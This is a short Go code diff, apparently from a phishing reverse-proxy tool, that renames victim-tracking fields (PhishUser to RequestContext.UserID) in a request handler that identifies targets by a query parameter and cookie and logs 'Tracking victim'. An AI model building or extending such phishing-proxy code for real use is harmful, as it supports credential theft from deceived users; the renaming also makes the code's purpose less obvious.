@@ -131,8 +131,8 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 
 	//set up user tracking variables
 	if val, ok := queryString[runtime.TrackingParam]; ok {
-		reverseProxy.InitPhishUser = val[0]
-		reverseProxy.PhishUser = val[0]
+		reverseProxy.RequestContext.InitUserID = val[0]
+		reverseProxy.RequestContext.UserID = val[0]
 		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
 	}
 
@@ -142,7 +142,7 @@ func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
-		reverseProxy.PhishUser = cookie.Value
+		reverseProxy.RequestContext.UserID = cookie.Value
 	}
 
 	reverseProxy.Proxy.ServeHTTP(w, r)
